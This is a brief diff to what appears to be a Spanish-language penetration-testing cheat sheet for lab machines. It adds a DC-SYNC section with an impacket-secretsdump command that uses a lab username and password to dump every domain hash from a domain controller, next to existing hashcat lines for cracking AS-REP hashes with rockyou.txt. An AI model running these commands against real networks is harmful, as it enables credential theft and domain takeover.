@@ -124,6 +124,11 @@ hashcat -a 3 -m 18200  abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74
 -a 3 = siempre a menos que quieras meter una rule que seria= -a 0
 
 hashcat -a 3 -m 18200 hashes.txt rockyou.txt
+
+```
+### DC-SYNC
+```
+impacket-secretsdump -just-dc melanie:Welcome123@10.10.10.169  -outputfile dcsync_hashes ---> teniendo un usuario y contraseña validos te saca todos los demas
 ```
 ### SSH-SCP
 ```
